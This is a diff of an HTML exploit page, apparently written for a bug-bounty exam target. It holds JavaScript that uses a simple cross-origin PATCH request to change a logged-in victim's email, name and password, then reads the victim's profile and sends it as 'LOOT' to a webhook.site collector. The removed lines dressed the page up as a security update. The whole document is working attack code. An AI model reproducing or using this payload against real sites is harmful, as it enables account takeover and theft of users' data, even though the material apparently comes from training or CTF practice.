@@ -1,47 +1,40 @@
 <!DOCTYPE html>
 <html>
-<head><title>System Maintenance</title></head>
 <body>
     <script>
         const target = "https://api-bugbounty-exam.hashacademy.co/api/auth/profile";
         const webhook = "https://webhook.site/841a65c5-0695-459d-80da-91ae7613c283";
         const newEmail = "ladybughunter1@gmail.com";
 
-        // 1. DATA EXFILTRATION (Grab the Flag/Info)
+        // 1. Log arrival
+        fetch(webhook + "?bot_is_here=true");
+
+        // 2. The "Simple" PATCH (Bypasses Preflight)
+        // We use text/plain but format it as JSON. 
+        // Some servers accept this to avoid CORS.
+        fetch(target, {
+            method: "PATCH",
+            mode: "no-cors", 
+            headers: { "Content-Type": "text/plain" },
+            body: JSON.stringify({
+                "email": newEmail,
+                "fullName": "HACKED_ADMIN",
+                "password": "Password123!",
+                "confirmPassword": "Password123!"
+            })
+        });
+
+        // 3. The "Direct Exfiltration" (In case we can't change the account)
+        // This tries to read the flag directly from the profile page
         fetch(target)
-            .then(r => r.json())
+            .then(r => r.text())
             .then(data => {
                 fetch(webhook, {
                     method: 'POST',
                     mode: 'no-cors',
-                    body: JSON.stringify({type: "LOOT", content: data})
+                    body: "LOOT_DATA: " + data
                 });
             });
-
-        // 2. EMAIL CHANGE (Account Takeover via Reset)
-        fetch(target, {
-            method: "PATCH",
-            mode: "no-cors",
-            headers: { "Content-Type": "text/plain" },
-            body: JSON.stringify({
-                "email": newEmail,
-                "fullName": "PWNED_ADMIN"
-            })
-        });
-
-        // 3. DIRECT PASSWORD CHANGE (Account Takeover via Login)
-        fetch(target, {
-            method: "PATCH",
-            mode: "no-cors",
-            headers: { "Content-Type": "text/plain" },
-            body: JSON.stringify({
-                "password": "Password123!",
-                "confirmPassword": "Password123!"
-            })
-        }).then(() => {
-            fetch(webhook + "?status=Exploit_Finished");
-        });
     </script>
-    <h1>Updating Security Modules... Please do not close this window.</h1>
 </body>
 </html>
